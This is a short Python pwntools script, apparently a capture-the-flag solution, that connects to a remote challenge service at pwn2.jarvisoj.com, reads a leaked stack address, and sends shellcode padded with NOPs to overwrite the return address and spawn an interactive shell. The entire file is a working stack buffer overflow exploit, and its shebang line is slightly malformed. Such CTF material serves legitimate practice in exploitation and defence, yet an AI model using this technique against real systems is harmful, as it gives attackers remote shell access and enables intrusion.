#!user/bin/env python
# encoding:utf-8

from pwn import *
io = remote("pwn2.jarvisoj.com",9877)
shellcode = asm(shellcraft.sh())
buffer=io.recvline()[14:-2]
# print buffer
# print type(buffer)
buf_addr = int(buffer,16)
payload = shellcode + '\x90' * (0x88+0x4-len(shellcode)) + p32(buf_addr)
io.sendline(payload)
io.interactive()
io.close()
